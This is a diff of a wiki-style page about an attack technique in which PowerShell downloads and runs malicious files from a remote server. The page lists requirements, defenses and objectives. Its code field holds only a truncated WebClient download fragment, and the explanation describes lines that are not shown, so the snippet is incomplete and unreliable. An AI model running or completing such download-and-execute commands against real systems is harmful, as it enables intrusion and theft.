@@ -27,11 +27,15 @@ From a technical standpoint, this procedure involves the use of Powershell to es
 
 The business value of this procedure is that it allows attackers to gain access to sensitive data, steal credentials, and establish a foothold within a target environment. By executing code on the target system, attackers can maintain persistence and continue to operate within the target environment undetected.
 
+ 
+
 ## Requirements
 
 1. Access to a Powershell console
 
 1. Network access to a remote server hosting the malicious file
+
+ 
 
 ## Defense
 
@@ -41,16 +45,26 @@ The business value of this procedure is that it allows attackers to gain access 
 
 1. Ensure that Powershell is up-to-date with the latest security patches
 
+ 
+
 ## Objectives
 
 1. Download and execute a malicious file on a target system
+
+ 
 
 # Instructions
 
 1. This command downloads and executes malicious files from a remote server.
 
+ 
+
+
+
 **Code**: [[# Any version
 (New-Object System.Net.WebClient).Do]]
+
+
 
 > The command uses PowerShell to download and execute malicious files from a remote server. The first three lines of the command download and save a PowerShell script, a taskkill.exe file, and a binary file to the local system. The last two lines of the command execute the binary file on the local system. This command can be used by attackers to gain unauthorized access to a system, steal sensitive information, or cause damage to the system.
 
@@ -58,3 +72,5 @@ The business value of this procedure is that it allows attackers to gain access 
 
 - [[Download file]]
 - [[Powershell]]
+
+
